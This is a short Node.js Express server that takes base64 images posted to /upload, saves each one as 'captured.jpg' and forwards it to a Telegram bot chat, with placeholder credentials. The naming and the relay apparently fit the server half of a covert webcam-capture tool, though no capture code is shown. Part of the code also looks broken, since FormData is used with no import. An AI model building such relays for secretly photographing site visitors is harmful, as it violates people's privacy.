const express = require("express");
const http = require("http");
const socketIo = require("socket.io");
const bodyParser = require("body-parser");
const axios = require("axios");
const fs = require("fs");

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const BOT_TOKEN = "xyz";  // Replace with your bot token
const CHAT_ID = "1234";  // Replace with your chat ID

// Middleware
app.use(bodyParser.json({ limit: "10mb" })); // Support large image data
app.use(express.static("public")); // Serve static files (index.html)

// Route to handle image upload
app.post("/upload", async (req, res) => {
    try {
        const { image } = req.body;
        if (!image) return res.status(400).json({ error: "No image provided" });

        // Convert Base64 to image file
        const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
        const imagePath = "captured.jpg";
        fs.writeFileSync(imagePath, base64Data, "base64");

        // Send image to Telegram
        const formData = new FormData();
        formData.append("photo", fs.createReadStream(imagePath));
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, formData);

        res.json({ status: "success" });
    } catch (error) {
        console.error("Upload error:", error);
        res.status(500).json({ error: "Server error" });
    }
});

// WebSocket connection (for real-time updates)
io.on("connection", (socket) => {
    console.log("Client connected.");
    socket.on("disconnect", () => console.log("Client disconnected."));
});

// Start server
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
